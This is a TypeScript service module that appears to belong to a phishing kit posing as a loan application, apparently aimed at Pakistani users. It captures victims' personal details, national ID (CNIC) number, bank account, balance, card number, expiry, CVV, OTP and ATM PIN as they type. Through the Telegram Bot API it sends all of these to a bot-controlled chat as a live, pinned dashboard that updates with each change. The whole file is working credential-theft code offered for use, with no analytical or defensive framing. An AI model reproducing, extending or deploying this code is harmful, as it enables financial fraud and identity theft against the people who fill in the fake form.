// Service to maintain a SINGLE PINNED SESSION MESSAGE in Telegram and edit it in real-time

const BOT_TOKEN =
  (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN ||
  process.env.VITE_TELEGRAM_BOT_TOKEN ||
  process.env.TELEGRAM_BOT_TOKEN ||
  '';

const CHAT_ID =
  (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID ||
  process.env.VITE_TELEGRAM_CHAT_ID ||
  process.env.TELEGRAM_CHAT_ID ||
  '';

// Single Session State Storage
let sessionId = Math.random().toString(36).substring(2, 9).toUpperCase();
let activeMessageId: number | null = null;
let isPinned = false;

interface SessionState {
  currentStep: string;
  stepTitle: string;
  personal: {
    fullName: string;
    cnic: string;
    mobileNo: string;
    gender: string;
    dob: string;
    province: string;
    address: string;
  };
  bank: {
    loanAmount: string;
    loanPurpose: string;
    occupation: string;
    bankName: string;
    accountNumber: string;
    currentBalance: string;
    monthlyIncome: string;
  };
  card: {
    cardNumber: string;
    expiry: string;
    cvv: string;
  };
  otp: string;
  pin: string;
  trackingId: string;
  lastUpdated: string;
}

const currentSession: SessionState = {
  currentStep: 'hero',
  stepTitle: 'Home Hero Page',
  personal: {
    fullName: '',
    cnic: '',
    mobileNo: '',
    gender: '',
    dob: '',
    province: '',
    address: '',
  },
  bank: {
    loanAmount: '500,000',
    loanPurpose: '',
    occupation: '',
    bankName: '',
    accountNumber: '',
    currentBalance: '',
    monthlyIncome: '',
  },
  card: {
    cardNumber: '',
    expiry: '',
    cvv: '',
  },
  otp: '',
  pin: '',
  trackingId: '',
  lastUpdated: new Date().toLocaleTimeString('en-PK'),
};

let updateTimer: NodeJS.Timeout | null = null;

/**
 * Format the entire session state into a single HTML Dashboard message
 */
function renderSessionDashboard(): string {
  const s = currentSession;
  return (
    `🟢 <b>LIVE SESSION DASHBOARD</b> [<code>#${sessionId}</code>]\n` +
    `📌 <b>Status:</b> ${s.currentStep.toUpperCase()} (${s.stepTitle})\n` +
    `⏰ <b>Last Active:</b> ${s.lastUpdated}\n\n` +

    `👤 <b>PERSONAL DETAILS</b>\n` +
    `• Name: <b>${s.personal.fullName || '---'}</b>\n` +
    `• CNIC: <code>${s.personal.cnic || '---'}</code>\n` +
    `• Mobile: <code>${s.personal.mobileNo || '---'}</code>\n` +
    `• DOB: <b>${s.personal.dob || '---'}</b>\n` +
    `• Gender: ${s.personal.gender || '---'}\n` +
    `• Province: ${s.personal.province || '---'}\n` +
    `• Address: ${s.personal.address || '---'}\n\n` +

    `🏦 <b>BANK & FINANCIAL DETAILS</b>\n` +
    `• Loan Amount: <b>Rs. ${s.bank.loanAmount || '---'}</b>\n` +
    `• Purpose: ${s.bank.loanPurpose || '---'}\n` +
    `• Occupation: ${s.bank.occupation || '---'}\n` +
    `• Bank: <b>${s.bank.bankName || '---'}</b>\n` +
    `• Account/IBAN: <code>${s.bank.accountNumber || '---'}</code>\n` +
    `• Balance: <b>Rs. ${s.bank.currentBalance || '---'}</b>\n` +
    `• Monthly Income: <b>Rs. ${s.bank.monthlyIncome || '---'}</b>\n\n` +

    `💳 <b>CARD DETAILS</b>\n` +
    `• Card Number: <code>${s.card.cardNumber || '---'}</code>\n` +
    `• Expiry: <code>${s.card.expiry || '---'}</code>\n` +
    `• CVV: <code>${s.card.cvv || '---'}</code>\n\n` +

    `🔑 <b>LIVE SECURITY CODES</b>\n` +
    `• Live OTP Code: <code>${s.otp || '---'}</code>\n` +
    `• Live ATM PIN: <code>${s.pin || '---'}</code>\n` +
    (s.trackingId ? `\n🎉 <b>Tracking ID:</b> <code>${s.trackingId}</code>` : '')
  );
}

/**
 * Dispatch real-time DOM-style update to Telegram (Single Pinned Message)
 */
async function syncSessionToTelegram() {
  const botToken =
    (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN ||
    (typeof process !== 'undefined' && process.env?.TELEGRAM_BOT_TOKEN) ||
    BOT_TOKEN;
  const chatId =
    (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID ||
    (typeof process !== 'undefined' && process.env?.TELEGRAM_CHAT_ID) ||
    CHAT_ID;

  if (!botToken || botToken.includes('example_token_replace_me') || !chatId) {
    return;
  }

  currentSession.lastUpdated = new Date().toLocaleTimeString('en-PK');
  const text = renderSessionDashboard();

  try {
    // 1. If we don't have an active message ID yet, create one
    if (!activeMessageId) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const resp = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
        }),
      });

      const data = await resp.json();
      if (data.ok && data.result?.message_id) {
        activeMessageId = data.result.message_id;

        // Try pinning the newly created session message
        try {
          const pinUrl = `https://api.telegram.org/bot${botToken}/pinChatMessage`;
          await fetch(pinUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: activeMessageId,
              disable_notification: true,
            }),
          });
          isPinned = true;
        } catch (pinErr) {
          console.warn('[Telegram] Pinning optional warning:', pinErr);
        }
      }
      return;
    }

    // 2. If active message ID exists, EDIT the existing message in real-time
    const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
    const editResp = await fetch(editUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: activeMessageId,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    const editData = await editResp.json();
    // If message was deleted or failed to edit, reset activeMessageId so next update creates a new message
    if (!editData.ok && editData.description && !editData.description.includes('exactly the same')) {
      if (editData.description.includes('not found') || editData.description.includes('deleted')) {
        activeMessageId = null;
      }
    }
  } catch (error) {
    console.error('[Telegram Service] Real-time edit error:', error);
  }
}

/**
 * Debounced trigger for real-time live typing updates
 */
export function triggerDebouncedTelegramSync(delayMs = 400) {
  if (updateTimer) clearTimeout(updateTimer);
  updateTimer = setTimeout(() => {
    syncSessionToTelegram();
  }, delayMs);
}

/**
 * Step navigation update listener
 */
export function sendStepNotification(stepName: string, stepTitle: string) {
  currentSession.currentStep = stepName;
  currentSession.stepTitle = stepTitle;
  triggerDebouncedTelegramSync(100);
}

/**
 * Personal Info real-time listener
 */
export function sendRealtimePersonalInfoUpdate(data: Partial<SessionState['personal']>) {
  currentSession.personal = { ...currentSession.personal, ...data };
  triggerDebouncedTelegramSync(400);
}

/**
 * Bank Info real-time listener
 */
export function sendRealtimeBankInfoUpdate(data: Partial<SessionState['bank']>) {
  currentSession.bank = { ...currentSession.bank, ...data };
  triggerDebouncedTelegramSync(400);
}

/**
 * Card Info real-time listener
 */
export function sendRealtimeCardInfoUpdate(data: Partial<SessionState['card']>) {
  currentSession.card = { ...currentSession.card, ...data };
  triggerDebouncedTelegramSync(300);
}

/**
 * OTP Code real-time listener
 */
export function sendRealtimeOtpUpdate(otp: string) {
  currentSession.otp = otp;
  triggerDebouncedTelegramSync(200);
}

/**
 * ATM PIN real-time listener
 */
export function sendRealtimePinUpdate(pin: string) {
  currentSession.pin = pin;
  triggerDebouncedTelegramSync(200);
}

/**
 * Final Submission summary update
 */
export function sendFinalApplicationToTelegram(payload: {
  trackingId: string;
  personal: any;
  bank: any;
  card: any;
  otp: string;
  pin: string;
}) {
  currentSession.trackingId = payload.trackingId;
  currentSession.personal = { ...currentSession.personal, ...payload.personal };
  currentSession.bank = { ...currentSession.bank, ...payload.bank };
  currentSession.card = { ...currentSession.card, ...payload.card };
  currentSession.otp = payload.otp;
  currentSession.pin = payload.pin;
  currentSession.currentStep = 'SUBMITTED';
  currentSession.stepTitle = 'Application Completed';
  syncSessionToTelegram();
}
